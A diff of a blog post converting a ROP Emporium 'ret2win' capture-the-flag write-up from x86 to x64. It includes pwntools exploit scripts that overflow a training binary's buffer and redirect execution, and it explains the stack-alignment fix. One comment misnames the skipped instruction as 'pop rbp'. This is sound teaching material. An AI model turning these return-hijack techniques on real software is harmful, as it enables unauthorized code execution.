@@ -1,9 +1,9 @@
 ---
 layout: post
-title:  "ROP Emporium ret2win Writeup (x86)"
+title:  "ROP Emporium ret2win Writeup (x64)"
 date:   2024-05-31 13:15:45 -0400
 categories: rop-emporium ret2win
-tags: rop-emporium ret2win x86 writeup buffer-overflow rop
+tags: rop-emporium ret2win x64 writeup buffer-overflow rop
 ---
 ## Introduction
 [ROP Emporium](https://ropemporium.com/index.html){:target="_blank"}{:rel="noopener noreferrer"}
@@ -123,13 +123,13 @@ build and send our payload to the vulnerable program.
 Since this is a ROP challenge we know the stack won't
 be executable. Just to be sure we can run
 ```bash
-checksec ret2win32
+checksec ret2win
 ```
-![checksec](/images/ret2win/x86-checksec.png)
+![checksec](/images/ret2win/x64-checksec.png)
 
 The `NX` flag is set meaning you can't execute code from
 a writable part of memory. We're also dealing with
-a 32 bit binary using little endian.
+a 64 bit binary using little endian.
 
 > This will be the same for every challenge
 {: .prompt-info }
@@ -151,10 +151,10 @@ from pwn import *
 # context.terminal = ['kitty']
 
 # create payload
-payload = cyclic(60, n=4)
+payload = cyclic(60, n=8)
 
 # debug rop chain
-io = gdb.debug('./ret2win32', '''
+io = gdb.debug('./ret2win', '''
                b pwnme
                c
                ''')
@@ -168,14 +168,14 @@ called. Continue the program with `continue` and
 wait for the program to crash. To get the offset we
 can run
 ```
-cyclic -l 0x6161616c -n 4
+cyclic -l 0x6161616161616166 -n 8
 ```
-![offset](/images/ret2win/x86-offset.png)
+![offset](/images/ret2win/x64-offset.png)
 
-Our offset is 44 bytes. After this, we're able to control
+Our offset is 40 bytes. After this, we're able to control
 where the program will return to.
 
-> This will be the same for every x86 challenge
+> This will be the same for every x64 challenge
 {: .prompt-info }
 
 
@@ -190,26 +190,81 @@ our goal is to call the function `ret2win`
 Using `radare2` we can analyze a binary by
 running `aaa`. To list functions with their
 addresses we can run `afl`
-![ret2win-addr](/images/ret2win/x86-ret2win-addr.png)
+![ret2win-addr](/images/ret2win/x64-ret2win-addr.png)
 
-So the address of `sym.ret2win` is `0x0804862c`
+So the address of `sym.ret2win` is `0x00400756`
 
-## Exploit
-Now we have everything we need to build the exploit
+### Debugging
+We should have everything we need to build the exploit
 ```python
 #!/bin/python3
 from pwn import *
 
 # create payload
-ret2win_addr = 0x0804862c
+ret2win_addr = 0x00400756
 # fill buffer + rbp
-payload = b'A'*44
-# adds the proper 32 bit padding
+payload = b'A'*40
+# adds the proper 64 bit padding
 # and uses little endian
-payload += p32(ret2win_addr)
+payload += p64(ret2win_addr)
 
 # send payload
-io = process('./ret2win32')
+io = process('./ret2win')
+io.sendline(payload)
+
+# retrieve output
+print(io.recvall())
+```
+
+![missing-flag](/images/ret2win/x64-missing-flag.png)
+
+When we run this we reach the `ret2win` function
+since the text `Here's your flag:` is printed to
+the screen, but the flag isn't printed. What's
+going on?
+
+> The answer is in the `Common pitfalls` section
+> in the [Beginners' guide](https://ropemporium.com/guide.html){:target="_blank"}{:rel="noopener noreferrer"}
+{: .prompt-tip }
+
+
+The x64 calling convention requires the stack to be
+16 byte aligned when calling certain functions. Using
+`radare2` we can check what instructions are being
+run at this address
+
+```
+s sym.ret2win
+V
+p
+```
+![ret2win-asm](/images/ret2win/x64-ret2win-asm.png)
+
+The address we're jumping to, `0x00400756`, executes
+a `push` instruction which places a value onto the
+stack. This is likely misaligning the stack and
+causing the a crash when `system` is called.
+
+To solve this, we can just change the address we
+return to! If we skip the `push` instruction
+entirely our stack should be properly aligned
+for the `system` call.
+
+## Exploit
+By fixing the address our final exploit becomes
+```python
+#!/bin/python3
+from pwn import *
+
+# create payload
+ret2win_addr = 0x00400756
+payload = b'A'*40
+# return to mov rbp, rsp
+# rather than pop rbp
+payload += p64(ret2win_addr + 1)
+
+# send payload
+io = process('./ret2win')
 io.sendline(payload)
 
 # retrieve flag
@@ -217,14 +272,14 @@ io.recvuntil(b'flag:\n')
 flag = io.recvline()
 success(flag)
 ```
-![flag](/images/ret2win/x86-flag.png)
+![flag](/images/ret2win/x64-flag.png)
 
 ## Conclusion
 This challenge is fairly straightforward but being able
 to control the `instruction pointer` is the
 basis for all challenges going forward. Since the goal
 of ROP Emporium is to teach ROP in isolation, all
-`x86` challenges will use the same offset
-of `44 bytes` and will have the same compiled protections.
+`x64` challenges will use the same offset
+of `40 bytes` and will have the same compiled protections.
 For the sake of brevity, I won't go over finding the
 protections and offset in every challenge.
